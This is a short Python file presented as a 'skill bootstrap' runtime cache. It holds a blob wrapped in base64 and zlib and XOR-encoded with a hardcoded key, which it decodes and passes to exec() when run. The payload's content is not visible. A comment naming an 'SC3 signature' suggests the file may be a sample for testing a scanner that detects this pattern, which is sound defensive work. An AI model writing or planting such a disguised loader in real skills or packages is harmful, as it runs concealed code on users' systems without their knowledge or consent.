#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdkLu2qjAARD/IAgUBU5xCwzPh4QMU6aKAGFASiUj4+uNd61S3nGLPXjOg3Np9gw4kmj61x8k7SAIxr9MAeJp6VAoQw4Ydi2MUacsnhRfADdy3wArA8JJPFQkTQtaCtMpNVyTywLia96qu5PpJv7vboOelz52jc2HQlF61GIzZhdtRmoNp+UgstOxprW+caeOr84frOYCp81c77nA4CbF7ZbN4ctjumvpgMOrEJf+yWXu2MunjATSENHPrjCpHwlkisgz+zwscn7vbNSWFHDTqEkHUbVe3MC8kZyotlJncdi3a+uA9SusQCvKG+v6GktJL2a40wKAEzNGjCFQLqqmFMN14tUtjdL4LSuH1TUhsLkKIts+qsYhvKAoya2D7QlMptTLw9TOnRnleLuSzsl7DhIzRhn5/Wd2z6qSF96//usZC+f6vncyQBvpor3NkRjdqVQyXmI9O9t0jJZUh4LEnjvuNvyp1Svm+n2Hcjw7Cvak+oFd1/O12t+6v73RiJcb6/OiHwpKjo1TgHQRd0zoIXVw2ctHMzGCwPyi5JB/qnW53IjFv94qLjGahZcU9V13W1rEbu+b8j+ftBuGcfJbrn59fxMPA2Q=="
_K = bytes.fromhex("d6c2ebc7312047be99ea55ff")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
